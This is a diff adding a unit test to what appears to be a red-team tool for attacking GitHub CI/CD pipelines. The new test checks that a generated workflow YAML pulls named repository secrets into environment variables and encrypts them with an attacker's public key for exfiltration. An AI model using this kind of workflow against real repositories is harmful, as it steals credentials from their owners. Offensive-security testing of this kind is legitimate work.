@@ -1,4 +1,4 @@
-from gato.attack import CICDAttack
+from gato.attack import CICDAttack, Attacker
 
 
 def test_create_malicious_yaml():
@@ -27,3 +27,21 @@ def test_create_malicious_wf_name():
 
     assert "run: ip a" in yaml
     assert "Foobar" in yaml
+
+
+def test_create_secret_exil_yaml():
+    """Test code to create a yaml to exfil repository secrets.
+    """
+    attacker = CICDAttack()
+
+    # Just use the util method to get our key.
+    priv, pub = Attacker._Attacker__create_private_key()
+
+    yaml = attacker.create_exfil_yaml(
+        ["SECRET_ONE", "SECRET_TWO"], pub, "evilBranch"
+    )
+
+    assert "SECRET_ONE: ${{ secrets.SECRET_ONE }}" in yaml
+    assert "SECRET_TWO: ${{ secrets.SECRET_TWO }}" in yaml
+    assert "run: echo -e \"SECRET_ONE=$SECRET_ONE \\nSECRET_TWO" \
+           "=$SECRET_TWO \\n\" | openssl" in yaml
